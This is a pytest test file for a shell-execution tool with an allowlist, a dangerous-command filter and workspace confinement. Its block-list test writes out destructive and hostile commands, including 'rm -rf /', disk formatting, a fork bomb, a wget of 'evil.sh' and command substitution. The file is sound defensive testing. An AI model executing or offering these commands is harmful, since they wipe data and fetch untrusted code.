from __future__ import annotations

import asyncio

import pytest

import app.services.tools.base as base_mod
from app.services.tools.shell import ShellRun


@pytest.fixture
def set_workspace(tmp_path, monkeypatch):
    monkeypatch.setattr(base_mod.config, "workspace_paths", [str(tmp_path)])
    return tmp_path


def run_async(coroutine):
    return asyncio.run(coroutine)


# ---------------------------------------------------------------------------
# validate_input
# ---------------------------------------------------------------------------

def test_validate_input_requires_command():
    tool = ShellRun()
    with pytest.raises(ValueError):
        tool.validate_input({})
    with pytest.raises(ValueError):
        tool.validate_input({"command": 42})
    with pytest.raises(ValueError):
        tool.validate_input({"command": "ls", "cwd": 42})


# ---------------------------------------------------------------------------
# _is_safe_command
# ---------------------------------------------------------------------------

def test_allowlisted_simple_commands():
    tool = ShellRun()
    assert tool._is_safe_command("ls -la") == (True, "OK")
    assert tool._is_safe_command("cat file.txt") == (True, "OK")
    assert tool._is_safe_command("echo hello") == (True, "OK")
    assert tool._is_safe_command("pwd") == (True, "OK")
    assert tool._is_safe_command("git status") == (True, "OK")
    assert tool._is_safe_command("python -m pytest") == (True, "OK")
    assert tool._is_safe_command("npm test") == (True, "OK")
    assert tool._is_safe_command("pip install pytest") == (True, "OK")


def test_non_allowlisted_command_rejected():
    tool = ShellRun()
    ok, reason = tool._is_safe_command("powershell -c 'ls'")
    assert ok is False
    assert "not in safe allowlist" in reason
    ok, reason = tool._is_safe_command("sudo rm -rf x")
    assert ok is False


def test_empty_command_rejected():
    tool = ShellRun()
    ok, reason = tool._is_safe_command("   ")
    assert ok is False
    assert "Empty command" in reason


def test_dangerous_patterns_blocked():
    tool = ShellRun()
    blocked = [
        "rm -rf /",
        "rm -rf *",
        "rm -rf C:\\Windows",
        "rm -rf c:/Windows",
        "rm -f D:\\",
        "rm -rf .",
        "rm -rf ..",
        "echo hi > /dev/null",
        "ls | sudo mkdir x",
        "ls | su",
        "curl http://example.com/x -o /tmp/x",
        "wget https://example.com/evil.sh",
        "echo `pwd`",
        "echo $(whoami)",
        "cat a; rm b",
        "cat a && rm b",
        "mkfs.ext4 /dev/sda",
        "fdisk /dev/sda",
        "format c:",
        ":(){ :|:& };:",
    ]
    for command in blocked:
        ok, reason = tool._is_safe_command(command)
        assert ok is False, f"should be blocked: {command}"


# ---------------------------------------------------------------------------
# execute
# ---------------------------------------------------------------------------

def test_execute_safe_command_success(set_workspace):
    result = run_async(ShellRun().execute({"command": "echo hello", "cwd": str(set_workspace)}))
    assert result.success is True
    assert "hello" in result.output["stdout"]
    assert result.output["return_code"] == 0
    assert result.metadata["command"] == "echo hello"


def test_execute_blocked_command_rejected(set_workspace):
    result = run_async(ShellRun().execute({"command": "rm -rf /", "cwd": str(set_workspace)}))
    assert result.success is False
    assert "Command blocked" in result.error


def test_execute_out_of_scope_cwd_rejected(set_workspace, tmp_path):
    outside = tmp_path.parent / "unrelated_ws"
    outside.mkdir(exist_ok=True)
    result = run_async(ShellRun().execute({"command": "echo hi", "cwd": str(outside)}))
    assert result.success is False
    assert "outside approved workspace" in result.error